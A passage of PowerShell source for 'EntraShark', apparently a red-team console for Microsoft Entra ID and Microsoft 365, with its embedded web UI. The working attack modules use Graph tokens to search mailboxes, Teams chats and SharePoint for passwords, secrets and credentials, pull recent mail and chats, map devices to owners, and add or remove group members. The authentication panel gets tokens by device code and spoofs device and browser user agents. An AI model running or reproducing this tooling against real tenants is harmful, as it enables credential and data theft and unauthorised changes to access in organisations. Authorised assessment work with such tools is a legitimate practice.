const tabs=JSON.parse(document.getElementById('data').textContent||'[]');let cur=tabs[0]?.name||'';const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));function cell(v){const t=String(v??'');return /^https?:\/\//i.test(t)?'<a target="_blank" rel="noopener noreferrer" href="'+esc(t)+'">'+esc(t)+'</a>':esc(t)}function renderTabs(){document.getElementById('tabs').innerHTML=tabs.map(t=>'<button class="'+(t.name===cur?'active':'')+'" onclick="cur=\''+esc(t.name)+'\';renderTabs();render()">'+esc(t.name)+'</button>').join('')}function render(){const data=tabs.find(t=>t.name===cur)||{rows:[]};const term=(document.getElementById('filter').value||'').toLowerCase();const rows=term?data.rows.filter(r=>JSON.stringify(r).toLowerCase().includes(term)):data.rows;const cols=[];rows.forEach(r=>Object.keys(r||{}).forEach(k=>{if(!cols.includes(k))cols.push(k)}));document.getElementById('tbl').innerHTML=cols.length?'<caption style="text-align:left;padding:8px;font-weight:600">'+esc(cur)+' - '+rows.length+' row(s)</caption><thead><tr>'+cols.map(c=>'<th>'+esc(c)+'</th>').join('')+'</tr></thead><tbody>'+rows.map(r=>'<tr>'+cols.map(c=>'<td>'+cell(r[c])+'</td>').join('')+'</tr>').join('')+'</tbody>':'<tbody><tr><td>No rows</td></tr></tbody>'}document.getElementById('filter').addEventListener('input',render);renderTabs();render();
</script></body></html>
"@
        $html | Set-Content -LiteralPath $report -Encoding UTF8
        Log "Updated merged report: $report"
    }
    function MergeTempRunArtifacts {
        param([string]$TempRun, [string]$RequestedDataset)
        $copied = 0
        $tempEvidence = Join-Path $TempRun 'evidence'
        if (Test-Path -LiteralPath $tempEvidence) {
            foreach ($csv in @(Get-ChildItem -LiteralPath $tempEvidence -Filter '*.csv' -File)) {
                Copy-Item -LiteralPath $csv.FullName -Destination (Join-Path (Join-Path $run 'evidence') $csv.Name) -Force
                $rows = @(Import-Csv -LiteralPath $csv.FullName).Count
                Log "Merged evidence $($csv.Name) ($rows row(s))"
                $copied++
            }
        }
        $tempRaw = Join-Path $TempRun 'raw'
        if (Test-Path -LiteralPath $tempRaw) {
            foreach ($raw in @(Get-ChildItem -LiteralPath $tempRaw -File)) {
                Copy-Item -LiteralPath $raw.FullName -Destination (Join-Path (Join-Path $run 'raw') $raw.Name) -Force
            }
        }
        MergeRunDbFromTemp -TempRun $TempRun
        MergeFindingsFromTemp -TempRun $TempRun
        if ($RequestedDataset) {
            $requestedCsv = Join-Path (Join-Path $run 'evidence') "$RequestedDataset.csv"
            if (-not (Test-Path -LiteralPath $requestedCsv)) {
                WriteDatasetMarker -Dataset $RequestedDataset -Reason 'not-returned' -Detail "The module completed but did not produce $RequestedDataset.csv. Check api-calls.csv for denied or empty Graph responses." | Out-Null
            }
        }
        WriteMergedReport
        return $copied
    }
    function InvokeContentSearch {
        param(
            [string]$Name,
            [string[]]$EntityTypes,
            [string]$Query,
            [string]$CsvName,
            [string]$RawName,
            [int]$Size = 50
        )
        $token = Get-EntraSharkToken -Token $global:tokens
        if (-not $token) { throw 'No Graph token available for Microsoft Search.' }
        $request = @{ entityTypes=$EntityTypes; query=@{ queryString=$Query }; from=0; size=$Size }
        if ($Name -eq 'sharepoint') { $request.fields = @('name','webUrl','parentReference','lastModifiedDateTime','createdDateTime') }
        $body = @{ requests=@($request) } | ConvertTo-Json -Depth 10
        Log "Running $Name search: $Query"
        try {
            $r = Invoke-RestMethod -Method POST -Uri 'https://graph.microsoft.com/v1.0/search/query' -Headers @{ Authorization="Bearer $($token.AccessToken)"; 'Content-Type'='application/json' } -Body $body -ContentType 'application/json' -ErrorAction Stop
        } catch {
            $raw = $_.ErrorDetails.Message
            if ($raw) { Log "Microsoft Search error body: $raw" }
            throw
        }
        $out = Join-Path (Join-Path $run 'raw') $RawName
        WriteRawJson -Path $out -Value $r
        $hits = New-Object System.Collections.Generic.List[object]
        foreach ($block in @($r.value)) {
            foreach ($container in @($block.hitsContainers)) {
                foreach ($hit in @($container.hits)) {
                    $resource = $hit.resource
                    $from = $null
                    if ($resource.from -and $resource.from.emailAddress) { $from = $resource.from.emailAddress.address }
                    $hits.Add([pscustomobject]@{
                        search = $Name
                        query = $Query
                        entityTypes = ($EntityTypes -join ',')
                        rank = $hit.rank
                        summary = $hit.summary
                        name = $resource.name
                        subject = $resource.subject
                        title = $resource.title
                        from = $from
                        createdDateTime = $resource.createdDateTime
                        lastModifiedDateTime = $resource.lastModifiedDateTime
                        receivedDateTime = $resource.receivedDateTime
                        webUrl = $resource.webUrl
                        webLink = $resource.webLink
                        id = $resource.id
                    }) | Out-Null
                }
            }
        }
        $csv = Join-Path (Join-Path $run 'evidence') $CsvName
        $written = WriteEvidenceCsv -Path $csv -Rows @($hits.ToArray()) -Append
        New-EntraSharkEvidenceReport -Run $run | Out-Null
        Log "Updated $CsvName with $($hits.Count) new row(s); table now has $written row(s)"
        return [ordered]@{ output=$out; evidence=$csv; resultBlocks=@($r.value).Count; hits=$hits.Count; entityTypes=$EntityTypes; query=$Query }
    }
    function InvokeRecentMail {
        param([int]$Count)
        $token = Get-EntraSharkToken -Token $global:tokens
        if (-not $token) { throw 'No Graph token available for mail extraction.' }
        $top = [Math]::Max(1, [Math]::Min($Count, 500))
        $uri = "https://graph.microsoft.com/v1.0/me/messages?`$top=$top&`$orderby=receivedDateTime desc&`$select=id,subject,from,receivedDateTime,webLink,hasAttachments,importance"
        Log "Extracting most recent $top email message(s)"
        $r = Invoke-RestMethod -Method GET -Uri $uri -Headers @{ Authorization="Bearer $($token.AccessToken)" }
        $out = Join-Path (Join-Path $run 'raw') 'email-recent.json'
        WriteRawJson -Path $out -Value $r
        $rows = foreach($m in @($r.value)){
            [pscustomobject]@{ subject=$m.subject; from=$m.from.emailAddress.address; receivedDateTime=$m.receivedDateTime; importance=$m.importance; hasAttachments=$m.hasAttachments; webLink=$m.webLink; id=$m.id }
        }
        $csv = Join-Path (Join-Path $run 'evidence') 'email-search-results.csv'
        $written = WriteEvidenceCsv -Path $csv -Rows @($rows) -Append
        New-EntraSharkEvidenceReport -Run $run | Out-Null
        Log "Updated email-search-results.csv with $(@($rows).Count) new recent row(s); table now has $written row(s)"
        return [ordered]@{ output=$out; evidence=$csv; rows=@($rows).Count; mode='recent'; count=$top }
    }
    function InvokeRecentTeams {
        param([int]$Count)
        $token = Get-EntraSharkToken -Token $global:tokens
        if (-not $token) { throw 'No Graph token available for Teams extraction.' }
        $top = [Math]::Max(1, [Math]::Min($Count, 100))
        $uri = "https://graph.microsoft.com/v1.0/me/chats?`$top=$top"
        Log "Extracting most recent $top chat thread(s)"
        $r = Invoke-RestMethod -Method GET -Uri $uri -Headers @{ Authorization="Bearer $($token.AccessToken)" }
        $out = Join-Path (Join-Path $run 'raw') 'teams-recent.json'
        WriteRawJson -Path $out -Value $r
        $rows = foreach($c in @($r.value)){
            [pscustomobject]@{ topic=$c.topic; chatType=$c.chatType; createdDateTime=$c.createdDateTime; lastUpdatedDateTime=$c.lastUpdatedDateTime; webUrl=$c.webUrl; id=$c.id }
        }
        $csv = Join-Path (Join-Path $run 'evidence') 'teams-search-results.csv'
        $written = WriteEvidenceCsv -Path $csv -Rows @($rows) -Append
        New-EntraSharkEvidenceReport -Run $run | Out-Null
        Log "Updated teams-search-results.csv with $(@($rows).Count) new recent row(s); table now has $written row(s)"
        return [ordered]@{ output=$out; evidence=$csv; rows=@($rows).Count; mode='recent'; count=$top }
    }
    function InvokeDeviceOwnerMap {
        $token = Get-EntraSharkToken -Token $global:tokens
        if (-not $token) { throw 'No Graph token available for device owner mapping.' }
        $headers = @{ Authorization="Bearer $($token.AccessToken)" }
        $uri = 'https://graph.microsoft.com/v1.0/devices?$expand=registeredOwners&$top=999'
        $all = New-Object System.Collections.Generic.List[object]
        do {
            $r = Invoke-RestMethod -Method GET -Uri $uri -Headers $headers
            foreach ($d in @($r.value)) { $all.Add($d) | Out-Null }
            $uri = $r.'@odata.nextLink'
        } while ($uri)
        $rows = foreach ($d in @($all.ToArray())) {
            $owners = if ($d.registeredOwners) {
                ($d.registeredOwners | ForEach-Object { "$($_.displayName) <$($_.userPrincipalName)>" }) -join '; '
            } else { '<none>' }
            [pscustomobject]@{
                deviceName = $d.displayName
                deviceId = $d.deviceId
                objectId = $d.id
                operatingSystem = $d.operatingSystem
                operatingSystemVersion = $d.operatingSystemVersion
                trustType = $d.trustType
                isCompliant = $d.isCompliant
                isManaged = $d.isManaged
                lastSignIn = $d.approximateLastSignInDateTime
                owners = $owners
                ownerCount = @($d.registeredOwners).Count
            }
        }
        $out = Join-Path (Join-Path $run 'raw') 'device-owner-map.json'
        WriteRawJson -Path $out -Value @($all.ToArray())
        $csv = Join-Path (Join-Path $run 'evidence') 'device-owner-map.csv'
        WriteEvidenceCsv -Path $csv -Rows @($rows) | Out-Null
        New-EntraSharkEvidenceReport -Run $run | Out-Null
        return [ordered]@{ output=$out; evidence=$csv; rows=@($rows).Count; devicesWithOwners=@($rows | Where-Object { $_.ownerCount -gt 0 }).Count }
    }
    $Task.state='running'; $Task.started=(Get-Date).ToString('o'); $Task.message='Running attack module'; SaveTask $Task
    try {
        $vaultObj = Get-Content -LiteralPath $TokenVaultPath -Raw | ConvertFrom-Json
        foreach ($p in $vaultObj.PSObject.Properties) { Set-Variable -Name $p.Name -Scope Global -Value $p.Value }
        if (-not $global:tokens -and $global:graphTokens) { $global:tokens = $global:graphTokens }
        $run = if (Test-Path -LiteralPath $CurrentRunPath) { (Get-Content -LiteralPath $CurrentRunPath -Raw).Trim() } else { $null }
        if (-not $run) { $run = Join-Path $OutputRoot ("console-attack-" + (Get-Date -Format 'yyyyMMdd-HHmmss')); $run | Set-Content -LiteralPath $CurrentRunPath -Encoding UTF8 }
        New-Item -ItemType Directory -Force -Path (Join-Path $run 'raw') | Out-Null
        New-Item -ItemType Directory -Force -Path (Join-Path $run 'evidence') | Out-Null
        if ($Attack.kind -eq 'updatableGroups') {
            . $ToolPath
            Log 'Running updatable group probe'
            $resultObject = Test-GraphGroupWriteAccess -PassThru
            $rows = @(NormalizeRowsForCsv (ConvertGroupWriteAccessRows -Result $resultObject))
            $out = Join-Path (Join-Path $run 'raw') 'updatable-groups.json'
            WriteRawJson -Path $out -Value $resultObject
            $csv = Join-Path (Join-Path $run 'evidence') 'updatable-groups.csv'
            WriteEvidenceCsv -Path $csv -Rows @($rows) | Out-Null
            New-EntraSharkEvidenceReport -Run $run | Out-Null
            Log "Wrote updatable-groups.csv with $(@($rows).Count) row(s)"
            $Task.result=[ordered]@{ output=$out; evidence=$csv; rows=@($rows).Count }
        } elseif ($Attack.kind -eq 'deviceMap') {
            Log 'Running device owner map'
            $Task.result = InvokeDeviceOwnerMap
        } elseif ($Attack.kind -eq 'mailPull') {
            $query = if ($Attack.query) { $Attack.query } else { 'password OR secret OR credential' }
            $Task.result = InvokeContentSearch -Name 'mail' -EntityTypes @('message') -Query $query -CsvName 'email-search-results.csv' -RawName 'mail-search.json'
        } elseif ($Attack.kind -eq 'teamsSearch') {
            $query = if ($Attack.query) { $Attack.query } else { 'password OR secret OR credential' }
            $Task.result = InvokeContentSearch -Name 'teams' -EntityTypes @('chatMessage') -Query $query -CsvName 'teams-search-results.csv' -RawName 'teams-search.json'
        } elseif ($Attack.kind -eq 'sharePointSearch') {
            $query = if ($Attack.query) { $Attack.query } else { 'password OR secret OR credential OR confidential' }
            $Task.result = InvokeContentSearch -Name 'sharepoint' -EntityTypes @('driveItem') -Query $query -CsvName 'sharepoint-search-results.csv' -RawName 'sharepoint-search.json'
        } elseif ($Attack.kind -eq 'mailRecent') {
            $Task.result = InvokeRecentMail -Count ([int]$Attack.count)
        } elseif ($Attack.kind -eq 'teamsRecent') {
            $Task.result = InvokeRecentTeams -Count ([int]$Attack.count)
        } elseif ($Attack.kind -eq 'collectModule') {
            $modules = @($Attack.modules | Where-Object { $_ })
            if (-not $modules.Count) { throw 'No modules were provided for isolated collection.' }
            Log "Running isolated collection module(s): $($modules -join ', ')"
            $tempRun = Join-Path $Task.dir 'isolated-run'
            $params = @{ OutputDirectory=$tempRun; Quiet=$true; Modules=([string[]]$modules) }
            $result = Invoke-EntraShark @params
            $merge = Merge-EntraSharkRunArtifactSet -TargetRun $run -TempRun $result.OutputDirectory -RequestedDataset ([string]$Attack.dataset)
            $Task.result=[ordered]@{ outputDirectory=$run; tempRun=$result.OutputDirectory; modules=$result.Modules; findingCount=$result.Findings.Count; mergedEvidenceFiles=$merge.MergedEvidenceFiles; report=$merge.Report; reportTables=$merge.TableCount; reportRows=$merge.RowCount }
            Log "Isolated collection merged $($merge.MergedEvidenceFiles) evidence operation(s) into active run and regenerated report"
        } elseif ($Attack.kind -eq 'groupWrite') {
            if ($Attack.confirmText -ne 'AUTHORIZED') { throw 'Write actions require confirmation text AUTHORIZED.' }
            $token = Get-EntraSharkToken -Token $global:tokens
            $headers = @{ Authorization="Bearer $($token.AccessToken)"; 'Content-Type'='application/json' }
            if ($Attack.mode -eq 'add') {
                $body = @{ '@odata.id'="https://graph.microsoft.com/v1.0/directoryObjects/$($Attack.userId)" } | ConvertTo-Json
                Invoke-RestMethod -Method POST -Uri "https://graph.microsoft.com/v1.0/groups/$($Attack.groupId)/members/`$ref" -Headers $headers -Body $body -ContentType 'application/json'
            } elseif ($Attack.mode -eq 'remove') {
                Invoke-RestMethod -Method DELETE -Uri "https://graph.microsoft.com/v1.0/groups/$($Attack.groupId)/members/$($Attack.userId)/`$ref" -Headers $headers
            } else { throw 'Unknown group write mode.' }
            $Task.result=[ordered]@{ mode=$Attack.mode; groupId=$Attack.groupId; userId=$Attack.userId }
        } else { throw 'Unknown attack kind.' }
        $Task.state='completed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Attack module complete'; SaveTask $Task; Log 'Attack module complete'
    } catch {
        $Task.state='failed'; $Task.completed=(Get-Date).ToString('o'); $Task.message='Attack module failed'; $Task.error=$_.Exception.Message; SaveTask $Task; Log "Attack module failed: $($_.Exception.Message)"
    }
}

function Get-State {
    $run = Get-CurrentRun
    $tables = @()
    $tasks = @()
    $tokens = Get-TokenSummary
    if ($run) {
        $evidence = Join-Path $run 'evidence'
        if (Test-Path -LiteralPath $evidence) {
            $tables = @(Get-ChildItem -LiteralPath $evidence -Filter '*.csv' -File | Sort-Object Name | ForEach-Object {
                [ordered]@{ name = [IO.Path]::GetFileNameWithoutExtension($_.Name); file = $_.Name; length = $_.Length }
            })
        }
        $taskRoot = Get-RunTaskRoot -Run $run
        if ($taskRoot -and (Test-Path -LiteralPath $taskRoot)) {
            $tasks = @(Get-ChildItem -LiteralPath $taskRoot -Directory | Sort-Object LastWriteTime -Descending | Select-Object -First 10 | ForEach-Object { Read-Task -Id $_.Name })
        }
    }
    return [ordered]@{
        tenantId = $script:TenantId
        currentRun = $run
        tokens = $tokens
        runUser = Get-RunUserSummary -Run $run -Tokens $tokens
        options = Get-ConsoleOptions
        tables = $tables
        tasks = @($tasks | Where-Object { $_ })
    }
}

function Set-ConsoleRun {
    param([string]$Path)
    if (-not $Path) { throw 'Run path is required.' }
    $resolved = Resolve-Path -LiteralPath $Path -ErrorAction Stop
    $run = $resolved.Path
    if (-not (Test-Path -LiteralPath $run -PathType Container)) { throw "Run path is not a directory: $run" }
    $evidence = Join-Path $run 'evidence'
    $report = Join-Path $run 'report.html'
    if (-not (Test-Path -LiteralPath $evidence) -and -not (Test-Path -LiteralPath $report)) {
        throw 'Run path must contain an evidence directory or report.html.'
    }
    foreach ($child in @('tokens','tasks')) {
        New-Item -ItemType Directory -Force -Path (Join-Path $run $child) | Out-Null
    }
    Set-CurrentRun -Path $run
    return [ordered]@{ currentRun=$run; hasEvidence=(Test-Path -LiteralPath $evidence); hasReport=(Test-Path -LiteralPath $report); tokenVault=(Get-RunTokenVaultPath -Run $run); taskRoot=(Get-RunTaskRoot -Run $run) }
}

function Clear-ConsoleRun {
    $script:ActiveRun = $null
    return [ordered]@{ currentRun=$null }
}

function Read-RunDatabase {
    param([string]$Run)
    if (-not $Run) { return $null }
    $path = Join-Path $Run 'run-db.json'
    if (-not (Test-Path -LiteralPath $path)) { return $null }
    try { return (Get-Content -LiteralPath $path -Raw | ConvertFrom-Json) } catch { return $null }
}

function Get-RunDbMapValue {
    param($Map, [string]$Key)
    if (-not $Map -or -not $Key) { return $null }
    $prop = $Map.PSObject.Properties[$Key]
    if ($prop) { return $prop.Value }
    return $null
}

function Test-ConsoleObjectIdLike {
    param([string]$Value)
    return ($Value -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$' -or
            $Value -match '^[A-Za-z0-9_-]{10,}$')
}

function Add-RunDbResolvedColumns {
    param($RunDb, $Row)
    if (-not $RunDb -or -not $Row) { return $Row }
    $out = [ordered]@{}
    foreach ($prop in $Row.PSObject.Properties) {
        $out[$prop.Name] = $prop.Value
    }

    foreach ($prop in @($Row.PSObject.Properties)) {
        $name = [string]$prop.Name
        $value = if ($null -ne $prop.Value) { [string]$prop.Value } else { '' }
        if (-not $value -or $value -match '[;,\s]' -or -not (Test-ConsoleObjectIdLike -Value $value)) { continue }
        $base = if ($name -match 'Id$') { $name.Substring(0, $name.Length - 2) } else { $name }

        $entity = Get-RunDbMapValue -Map $RunDb.entitiesById -Key $value
        if ($entity) {
            if (-not $out.Contains("${base}Name")) { $out["${base}Name"] = $entity.displayName }
            if (-not $out.Contains("${base}Type")) { $out["${base}Type"] = $entity.type }
            if ($entity.userPrincipalName -and -not $out.Contains("${base}UserPrincipalName")) { $out["${base}UserPrincipalName"] = $entity.userPrincipalName }
            if ($entity.appId -and -not $out.Contains("${base}AppId")) { $out["${base}AppId"] = $entity.appId }
            continue
        }

        $role = Get-RunDbMapValue -Map $RunDb.directoryRoleDefinitionsById -Key $value
        if ($role) {
            if (-not $out.Contains("${base}Name")) { $out["${base}Name"] = $role.displayName }
            if (-not $out.Contains("${base}Description")) { $out["${base}Description"] = $role.description }
            continue
        }

        $armRole = Get-RunDbMapValue -Map $RunDb.armRoleDefinitionsById -Key $value
        if ($armRole) {
            if (-not $out.Contains("${base}Name")) { $out["${base}Name"] = $armRole.roleName }
            if (-not $out.Contains("${base}Type")) { $out["${base}Type"] = $armRole.roleType }
        }
    }

    return [pscustomobject]$out
}

function Get-TableRows {
    param([string]$Name)
    $run = Get-CurrentRun
    if (-not $run) { throw 'No run exists yet.' }
    $path = Join-Path (Join-Path $run 'evidence') "$Name.csv"
    if (-not (Test-Path -LiteralPath $path)) { throw "Unknown table $Name" }
    $db = Read-RunDatabase -Run $run
    return @(Import-Csv -LiteralPath $path | Select-Object -First 5000 | ForEach-Object { Add-RunDbResolvedColumns -RunDb $db -Row $_ })
}

function Get-ConsoleHtml {
@'
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>EntraShark Console</title>
<style>
:root { --nav:#0b2239; --accent:#0c4a75; --line:#d8e1ec; --bg:#f4f7fb; --text:#16202c; --ok:#157347; --warn:#b45309; --bad:#b42318; }
body { margin: 0; font-family: Segoe UI, Arial, sans-serif; background: var(--bg); color: var(--text); }
.shell { display: grid; grid-template-columns: 260px 1fr; min-height: 100vh; }
aside { background: var(--nav); color: white; padding: 18px 14px; }
aside h1 { font-size: 22px; margin: 0 0 18px; }
.nav button { display: block; width: 100%; text-align: left; margin: 5px 0; padding: 10px; border: 0; border-radius: 7px; background: rgba(255,255,255,.08); color: white; cursor: pointer; }
.nav button.active { background: #1e6091; }
main { padding: 20px; }
.panel { display: none; }
.panel.active { display: block; }
.grid { display: grid; grid-template-columns: repeat(2,minmax(280px,1fr)); gap: 14px; }
section.card { background: white; border: 1px solid var(--line); border-radius: 8px; padding: 14px; margin-bottom: 14px; }
h2 { margin: 0 0 12px; font-size: 18px; }
h3 { margin: 10px 0; font-size: 14px; }
label { display:block; font-size: 12px; color:#475569; margin-top:8px; }
input, select, textarea { width:100%; box-sizing:border-box; padding:8px; border:1px solid #cbd5e1; border-radius:6px; margin-top:3px; }
button { border: 1px solid #b8c4d2; background: white; border-radius: 6px; padding: 8px 10px; margin: 4px 4px 4px 0; cursor:pointer; }
button.primary { background: var(--accent); color:white; border-color:var(--accent); }
button.danger { background:#b42318; color:white; border-color:#b42318; }
.status { white-space: pre-wrap; font-family: Consolas, monospace; background:#0f172a; color:#d1d5db; padding:10px; border-radius:6px; max-height:330px; overflow:auto; }
.timeline { background:#0f172a; color:#d1d5db; padding:10px; border-radius:6px; max-height:520px; overflow:auto; font-family:Consolas, monospace; font-size:12px; }
.logrow { display:grid; grid-template-columns:178px 82px 1fr; gap:8px; padding:6px 4px; border-bottom:1px solid rgba(255,255,255,.08); align-items:start; }
.logrow .time { color:#94a3b8; }
.logrow .level { text-transform:uppercase; font-weight:700; }
.log-info .level { color:#93c5fd; }
.log-ok .level { color:#86efac; }
.log-warn .level { color:#fcd34d; }
.log-error .level { color:#fca5a5; }
.logdata { grid-column:3; color:#cbd5e1; white-space:pre-wrap; margin-top:3px; }
.hint { background:#eef6ff; border:1px solid #bfdbfe; padding:10px; border-radius:6px; }
.empty { background:#fff7ed; border:1px solid #fed7aa; color:#9a3412; padding:9px; border-radius:6px; margin:4px 0; }
.tableGroup { border:1px solid var(--line); border-radius:8px; padding:10px; margin:10px 0; background:#fbfdff; }
.tableGroup h3 { margin-top:0; color:#0f3050; }
.explorerShell { display:grid; grid-template-columns:220px 1fr; gap:10px; align-items:start; }
.groupNav { display:flex; flex-direction:column; gap:4px; }
.groupNav button { width:100%; text-align:left; margin:0; }
.datasetBar { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:8px; }
.datasetBar button.active, .groupNav button.active { background:var(--accent); color:white; border-color:var(--accent); }
.datasetBar button.missing { color:#9a3412; border-color:#fed7aa; background:#fff7ed; }
.datasetBar button.loading { opacity:.75; cursor:wait; }
.dataStatus { min-height:22px; font-size:12px; color:#475569; margin:6px 0; }
.dataStatus.error { color:#b42318; }
.dataActionPanel { margin-top:8px; }
.dataActionPanel .hint { margin:0; }
.dataActionPanel .rerunAction { margin-top:8px; }
.collectMini { font-size:11px; padding:5px 7px; }
.reportFrame { width:100%; height:calc(100vh - 168px); min-height:640px; border:1px solid var(--line); border-radius:8px; background:white; }
.splitbar { display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; }
.tokenGrid { display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:10px; margin-top:10px; }
.tokenCard { border:1px solid var(--line); border-radius:8px; padding:10px; background:#fbfdff; cursor:pointer; }
.tokenCard.expired { border-color:#f97316; background:#fff7ed; }
.tokenCard h3 { margin:0 0 6px; font-size:15px; color:#0f3050; }
.tokenMeta { color:#475569; font-size:12px; line-height:1.45; overflow-wrap:anywhere; }
.tokenSource { display:inline-block; border-radius:99px; padding:2px 7px; background:#e0f2fe; color:#075985; font-size:11px; margin-left:5px; }
.tokenState { display:inline-block; border-radius:99px; padding:2px 7px; background:#dcfce7; color:#166534; font-size:11px; margin-left:5px; }
.tokenState.expired { background:#fed7aa; color:#9a3412; }
.tokenAction { margin-top:8px; }
.modalBackdrop { position:fixed; inset:0; background:rgba(15,23,42,.58); display:none; align-items:center; justify-content:center; z-index:20; }
.modal { width:min(900px,92vw); max-height:86vh; overflow:auto; background:white; border-radius:8px; border:1px solid var(--line); padding:16px; box-shadow:0 18px 48px rgba(0,0,0,.35); }
.modal pre { background:#0f172a; color:#d1d5db; padding:10px; border-radius:6px; overflow:auto; }
.controlRow { display:grid; grid-template-columns:repeat(auto-fit,minmax(210px,1fr)); gap:10px; }
.tabs { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:10px; }
.tabs button.active { background:var(--accent); color:white; }
.tablewrap { overflow:auto; max-height:720px; border:1px solid var(--line); border-radius:8px; background:white; }
table { border-collapse:collapse; width:100%; font-size:12px; }
th,td { border-bottom:1px solid #e5e7eb; padding:7px 8px; text-align:left; vertical-align:top; max-width:440px; overflow-wrap:anywhere; }
th { position:sticky; top:0; background:#f8fafc; }
.pill { display:inline-block; padding:3px 7px; border-radius:99px; background:#e2e8f0; margin:2px; }
.activityBar { position: sticky; top: 0; z-index: 10; display:flex; justify-content:space-between; align-items:center; gap:10px; margin:0 0 14px; padding:10px 12px; border:1px solid #bfdbfe; border-radius:8px; background:#eff6ff; color:#0f3050; box-shadow:0 1px 4px rgba(15,23,42,.05); }
.activityBar.error { border-color:#fecaca; background:#fef2f2; color:#991b1b; }
.activityBar.busy { border-color:#fed7aa; background:#fff7ed; color:#9a3412; }
</style>
</head>
<body>
<div class="shell">
<aside>
<h1>EntraShark</h1>
<div class="nav">
<button class="active" onclick="showPanel('overview', this)">Overview</button>
<button onclick="showPanel('auth', this)">Authentication</button>
<button onclick="showPanel('recon', this)">Recon</button>
<button onclick="showPanel('data', this)">Data Explorer</button>
<button onclick="showPanel('report', this)">Report</button>
<button onclick="showPanel('attacks', this)">Attack Modules</button>
<button onclick="showPanel('logs', this)">Tasks & Logs</button>
</div>
</aside>
<main>
<div id="activityBar" class="activityBar"><span id="activityText">Ready.</span><span id="activityTime"></span></div>
<div id="overview" class="panel active">
<section class="card"><div class="splitbar"><h2>Session Overview</h2><button onclick="refreshTokens()">Refresh Current Run Token View</button></div><div id="overview-body"></div></section>
<section class="card"><h2>Run Selection</h2><p class="hint">Fresh console launches do not resume old runs automatically. Choose whether you are loading an existing run or starting a new assessment before using collection modules.</p><div class="controlRow"><label>Run folder path<input id="loadRunPath" placeholder="C:\Users\brad\Documents\EntraShark\out\console-..."></label><label>New run name<input id="newRunName" placeholder="blank = console-YYYYMMDD-HHMMSS"></label></div><button class="primary" onclick="loadRun()">Load Existing Run</button><button class="primary" onclick="startNewRunMode()">Start New Run</button><button onclick="clearRun()">Clear Current Run</button><span id="loadRunStatus" class="tokenMeta"></span></section>
</div>
<div id="auth" class="panel">
<div class="grid">
<section class="card"><h2>Acquire Graph Token</h2>
<label>Tenant domain / authority</label><input id="authTenant" placeholder="contoso.onmicrosoft.com, common, organisations">
<label>Tenant ID</label><input id="authTenantId" placeholder="tenant GUID">
<label>Auth method</label><select id="authMethod" onchange="handleAuthMethodChange()"><option>DeviceCode</option><option>Interactive</option></select>
<label>Client ID / alias</label><select id="authClientPreset" onchange="toggleCustomPickers()"></select><input id="authClientCustom" placeholder="custom client GUID or alias" style="display:none">
<label>Resource / alias</label><select id="authResourcePreset" onchange="toggleCustomPickers()"></select><input id="authResourceCustom" placeholder="custom resource URL, GUID or alias" style="display:none">
<label>Scope</label><input id="authScope" value=".default offline_access openid profile">
<label>Output variable</label><input id="authOutVar" list="tokenNameList" value="tokens">
<div class="controlRow">
<label>Redirect port<input id="authRedirectPort" placeholder="0 / blank for random"></label>
<label>Redirect path<input id="authRedirectPath" value="/"></label>
<label>Redirect URI<input id="authRedirectUri" placeholder="optional explicit URI"></label>
</div>
<div class="controlRow">
<label>Device<select id="authDevice"><option>Windows</option><option>Mac</option><option>Linux</option><option>AndroidMobile</option><option>iPhone</option><option>OS/2</option></select></label>
<label>Browser<select id="authBrowser"><option>Edge</option><option>Chrome</option><option>Firefox</option><option>Safari</option><option>IE</option><option>Android</option></select></label>
</div>
<label>Custom User-Agent</label><input id="authCustomUserAgent" placeholder="optional full UA override">
<label><input id="authUseV1" type="checkbox" style="width:auto"> Use v1 endpoint</label>
<label><input id="authCae" type="checkbox" style="width:auto"> Request CAE</label>
<button class="primary" onclick="startAuth()">Start Auth</button>
<div id="deviceBox" class="hint" style="display:none"></div>
</section>
<section class="card"><h2>Refresh Tokens</h2>
<label>Mode</label><select id="refreshMode"><option value="sweep">Sweep all known audiences</option><option value="single">Single resource</option></select>
<label>Input variable</label><input id="refreshInputVar" list="tokenNameList" value="tokens">
<label>Tenant ID / authority</label><input id="refreshTenantId" placeholder="blank = token tenant/common">
<label>Client ID / alias</label><select id="refreshClientPreset" onchange="toggleCustomPickers()"></select><input id="refreshClientCustom" placeholder="custom client GUID or alias" style="display:none">
<label>Resource for single mode</label><select id="refreshResourcePreset" onchange="toggleCustomPickers()"></select><input id="refreshResourceCustom" placeholder="custom resource URL, GUID or alias" style="display:none">
<label>Output variable for single mode</label><input id="refreshOutVar" value="armTokens">
<label>Scope override</label><input id="refreshScope" placeholder="optional explicit scope">
<div class="controlRow">
<label>Only audiences for sweep<input id="refreshOnly" placeholder="comma/space list e.g. arm graph"></label>
<label>Skip audiences for sweep<input id="refreshSkip" placeholder="comma/space list"></label>
</div>
<div class="controlRow">
<label>Device<select id="refreshDevice"><option>Windows</option><option>Mac</option><option>Linux</option><option>AndroidMobile</option><option>iPhone</option><option>OS/2</option></select></label>
<label>Browser<select id="refreshBrowser"><option>Edge</option><option>Chrome</option><option>Firefox</option><option>Safari</option><option>IE</option><option>Android</option></select></label>
</div>
<label>Custom User-Agent</label><input id="refreshCustomUserAgent" placeholder="optional full UA override">
<label><input id="refreshUseV1" type="checkbox" style="width:auto"> Use v1 endpoint</label>
<label><input id="refreshCae" type="checkbox" style="width:auto"> Request CAE</label>
<label><input id="refreshForce" type="checkbox" style="width:auto"> Force refresh-capability warning bypass</label>
<button class="primary" onclick="startRefresh()">Start Refresh</button>
</section>
</div>
<datalist id="tokenNameList"></datalist>
</div>
<div id="recon" class="panel">
<section class="card"><h2>Recon Collection</h2>
<p>Select modules or leave all selected. Recon runs in a background PowerShell job and streams module status below.</p>
<div id="moduleChecks"></div>
<label>Run mode</label><select id="reconRunMode"><option value="updateCurrent">Update current run</option></select>
<p class="tokenMeta">Use update mode only when you intentionally loaded or just created the run you want to extend.</p>
<label><input id="includeM365Search" type="checkbox" style="width:auto"> Include M365 sensitive keyword search</label><br>
